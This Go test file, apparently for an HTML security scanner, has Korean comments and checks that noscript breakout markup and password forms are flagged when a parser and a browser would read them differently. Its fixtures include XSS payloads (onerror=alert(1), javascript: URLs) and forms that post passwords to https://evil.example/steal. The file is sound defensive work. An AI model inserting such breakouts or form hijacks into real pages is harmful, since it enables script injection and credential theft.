package scanner

import (
	"strings"
	"testing"
)

// 브라우저와 해석이 갈리는 입력
func TestParserDifferential(t *testing.T) {
	cases := []struct {
		name, html, code string
	}{
		// 스크립트가 켜진 브라우저: <noscript> 는 첫 </noscript> 에서 끝난다
		{"noscript속성값탈출", `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>`, "inline-handler"},
		{"noscript링크탈출", `<noscript><a title="</noscript><a href=javascript:alert(1)>x</a>">y</a></noscript>`, "javascript-url"},
		{"noscript속style탈출", `<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>`, "inline-handler"},
		// 표가 폼과 입력을 갈라놓아도 브라우저는 form 요소 포인터로 묶는다 (x/net/html 로 대조)
		{"표안폼_입력이표밖으로", `<table><form action="https://evil.example/steal"><input type="password" name="pw"></form></table>`, "cross-origin-password-form"},
		{"표안폼_입력은표뒤", `<table><form action="https://evil.example/steal"></table><input type="password" name="pw">`, "cross-origin-password-form"},
		{"폼안표안입력", `<form action="https://evil.example/steal"><table><input type="password" name="pw"></table></form>`, "cross-origin-password-form"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if countCode(c.html, "https://a.com/", c.code) == 0 {
				t.Errorf("%s 가 보이지 않음: %s", c.code, c.html)
			}
		})
	}
}

func TestNoscriptBreakout(t *testing.T) {
	const code = "noscript-breakout"
	cases := []struct {
		name, html string
		want       int
	}{
		// 음성 — 안쪽을 마크업으로 읽어도 온전히 닫힌다
		{"이미지", `<noscript><img src="a.png"></noscript>`, 0},
		{"GTM", `<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-X" height="0" width="0" style="display:none"></iframe></noscript>`, 0},
		{"안내문", `<noscript>자바스크립트를 켜 주세요</noscript>`, 0},
		{"닫힌style", `<noscript><style>.x{}</style></noscript>`, 0},
		{"닫힌주석", `<noscript><!-- 주석 --></noscript>`, 0},
		{"속성값의꺾쇠", `<noscript><img alt="a > b" src="a.png"></noscript>`, 0},
		{"닫히지않은noscript", `<noscript><p title="x`, 0}, // 어느 쪽도 끝을 못 봤다 — 차이 없음
		{"스크립트속꺾쇠뒤빈noscript", `<script>if(a<b){}</script><noscript></noscript>`, 0},
		// 양성 — </noscript> 가 안쪽 구조의 한가운데에 있다
		{"큰따옴표속성값", `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`, 1},
		{"작은따옴표속성값", `<noscript><a title='</noscript><a href=javascript:alert(1)>'></noscript>`, 1},
		{"style안", `<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>`, 1},
		{"주석안", `<noscript><!--</noscript><img src=x onerror=alert(1)>--></noscript>`, 1},
		{"중첩noscript", `<noscript><noscript></noscript><img src=x onerror=alert(1)></noscript>`, 1},
		{"두번", `<noscript><p title="</noscript>"><noscript><p title="</noscript>">`, 2},
		{"탈출뒤빈noscript", `<noscript><p title="</noscript>"><noscript></noscript>`, 1},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, "https://a.com/", code); got != c.want {
				t.Errorf("%s → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}

func TestNoscriiptBreakoutOffset(t *testing.T) {
	const html = `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`
	f, ok := findFirst(html, "https://a.com/", "noscript-breakout")
	if !ok {
		t.Fatal("발견되지 않음")
	}
	if got := html[f.Offset:]; !strings.HasPrefix(got, "</noscript>") {
		t.Errorf("위치 %q, want </noscript>…", got)
	}
}
